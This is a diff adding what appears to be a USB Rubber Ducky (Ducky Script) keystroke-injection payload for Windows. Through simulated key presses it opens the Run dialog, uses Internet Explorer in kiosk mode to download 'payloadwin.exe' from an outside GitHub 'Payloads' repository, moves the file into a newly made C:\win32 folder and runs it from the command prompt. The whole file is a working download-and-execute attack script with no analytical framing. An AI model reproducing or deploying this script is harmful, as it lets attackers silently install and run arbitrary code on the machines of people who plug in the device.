@@ -1,0 +1,97 @@
+DELAY 2000
+
+
+GUI r
+
+
+DELAY 500
+
+
+STRING iexplore -k https://github.com/psychovill/Payloads/raw/master/payloadwin.exe
+
+
+ENTER
+
+
+DELAY 4000
+
+
+RIGHTARROW
+
+
+DELAY 400
+
+
+RIGHTARROW
+
+
+DELAY 400
+
+
+ENTER
+
+
+DELAY 500
+
+
+GUI d
+
+
+GUI r 
+
+
+DELAY 500
+
+
+STRING cmd
+
+
+ENTER
+
+
+STRING md C:\win32
+
+
+ENTER
+
+
+DELAY 500
+
+
+STRING cd Downloads
+
+
+ENTER
+
+
+DELAY 500
+
+
+STRING move payloadwin.exe C:\win32
+
+
+ENTER
+
+
+DELAY 500
+
+
+STRING cd C:\win32
+
+
+ENTER
+
+
+DELAY 500
+
+
+STRING payloadwin.exe
+
+
+ENTER 
+
+
+STRING exit
+
+
+ENTER
